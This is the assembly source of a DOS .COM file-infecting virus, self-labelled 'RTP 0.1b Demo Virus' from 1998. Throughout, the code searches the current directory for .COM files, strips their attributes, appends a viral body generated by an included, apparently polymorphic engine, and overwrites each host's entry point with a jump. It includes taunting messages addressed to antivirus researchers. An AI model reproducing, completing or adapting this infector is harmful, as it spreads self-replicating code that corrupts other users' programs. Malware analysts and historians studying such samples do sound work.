   include c:\asm\star.inc
   include c:\asm\short.inc

               .286
               .model tiny, nolanguage
               locals @@

   ;============================================================================
               .code
               org 100h
   ;----------------------------------------------------------------------------
   DTA         =   80h
   VStart          =   $
   VLength         =   (ofs VEnd - ofs Vstart)

   Virus           PROC    NEAR

               dw  9090h
       Clean3          db  0CDh, 020h, 242
       Delta_Displace  =   ofs $

               ;mov    ah,0FFh
               ;int    21h
               mov si,ofs Virus
       Clean3_Delta    =   wo [$-2]
               mov di,100h
               mov cs:[si + ofs Return_Seg - ofs Virus],cs
               lodsw
               movsw
               movsb
               scasw
               mov ax,cs
               mov bx,ax
               add bh,10h
               lea cx,[bx + 1000h]
               cmp cx,wo ds:[2]
               jae Return_to_Host
               mov es,bx
               mov cx,VLength
               rep movsb
       PUSH_BX:    push    bx
               push    ofs Jmp_Over
               retf

       Return_to_Host: mov ds,cs:[si + ofs Return_Seg - (ofs Clean3 + 3)]
               mov     cx,9
               DO
                push   0
               CYCLE   LU
               popa
               popf
               mvs es,ds
               mov sp,-2
               sti

               db  0EAh
               dw  100h
       Return_Seg  dw  ?
       Abort_SP    dw  ?
       Abort_SS    dw  ?

       Dirty3      db  0E9h
       JMP_Disp    dw  ?

       SearchString    db  '*.com',0

       Jmp_Over:       ;mov    by cs:PUSH_BX,53h
               mov ah,2Fh
               int 21h
               push    es bx
               mov ax,3524h
               int 21h
               push    es bx
               mvs ds,cs
               mvs es,cs
               mov ah,25h
               push    ax
               mov dx,ofs Abort
               int 21h
               mov ds:Abort_SP,sp
               mov ds:Abort_SS,ss

               mov ah,1Ah
               mov dx,ofs DTA
               int 21h

               mov ah,4Eh
               loop    $
               mov dx,ofs SearchString
               int 21h
               DO
                   mov dx,9Eh
                   call    Infect_DSDX
                   mov ah,4Fh
                   int 21h
               CYCLE   NC

       Abort:      cli
               mov ss,cs:Abort_SS
               mov sp,cs:Abort_SP
               sti
               pop ax dx ds
               int 21h
               pop dx ds
               mov ah,1Ah
               int 21h
               mov si,(ofs Clean3 + 3)
               jmp Return_to_Host

   Virus           ENDP

   ;----------------------------------------------------------------------------
   db  'RTP 0.1b Demo Virus (c) 1998, The Soul Manager',0

   ;----------------------------------------------------------------------------

   Infect_DSDX     PROC    NEAR

               mov ax,4300h
               int 21h
               DOIF    C
           @@ret:    ret
               DONE
               mov ax,4301h
               mov bx,cx
               sub cx,bx
               int 21h
               jc  @@ret
               push    bx
               push    ofs @@attributes

               mov ax,3D02h
               int 21h
               jc  @@ret
               xchg    ax,bx
               push    bx
               push    ofs @@close

               mov ax,5700h
               int 21h
               jc  @@ret
               push    ax cx dx
               push    ofs @@date

               mov ah,3Fh
               mov cx,3
               mov dx,ofs Clean3
               call    Int_21h_IO
               jc  @@ret
               mov al,2
               call    Seek0
               or  dx,dx
               jnz @@ret$
               cmp ax,55000
               ja  @@ret$
               not al
               test    al,1Fh
               jz  @@ret$
               inc ax
               and ax,0Fh
               xchg    ax,dx       ; AX:DX
               xchg    ax,cx       ; CX:DX
               mov ax,4201h
               int 21h

               push    bx
               mov si,ofs VStart
               add ax,si
               mov ds:Clean3_Delta,ax
               mov di,2000h
               mov cx,VLength
               xchg    bx,ax
               mov dx,5
               call    RTP_File
               sub ax,0103h
               mov cs:JMP_Disp,ax
               pop bx
               mov ah,40h
               call    Int_21h_IO
               jc  @@ret$

               mvs ds,cs
               mvs es,cs
               xor al,al
               call    Seek0
               mov ah,40h
               mov cx,3
               mov dx,ofs Dirty3
               call    Int_21h_IO
               jc  @@ret$

               mov al,2
               call    Seek0
               or  al,01Fh
               xchg    ax,dx
               mov ax,4200h
               int 21h
               mov ah,40h
               xor cx,cx
               cwd
               int 21h
           @@ret$: ret

           @@date: pop dx cx ax
               inc ax
           @@i21h_ret:
               int 21h
               ret

           @@close:pop bx
               mov ah,3Eh
               jmp @@i21h_ret

           @@attributes:
               pop cx
               mov ax,4301h
               jmp @@i21h_ret

   Infect_DSDX     ENDP

   ;----------------------------------------------------------------------------
   db  "Greetings Mr Kaspersky, we've been expecting you ;)",0

   ;----------------------------------------------------------------------------

   Int_21h_IO      PROC    NEAR

               int 21h
               DOIF    NC
                 cmp   ax,cx
               DONE
               ret

   Int_21h_IO      ENDP

   ;----------------------------------------------------------------------------

   Seek0           PROC    NEAR

               mov ah,42h
               loop    $
               cwd
               int 21h
               ret

   Seek0           ENDP

   ;----------------------------------------------------------------------------
   db  'If you can see this text, you are reading AVPVE!',0

   ;----------------------------------------------------------------------------
   ..xlist
   nolocals
   include d:\source\virus\rt\rtp\rtp.inc
   ..list
   ;----------------------------------------------------------------------------
   VEnd            =   $
               END Virus
   ;============================================================================
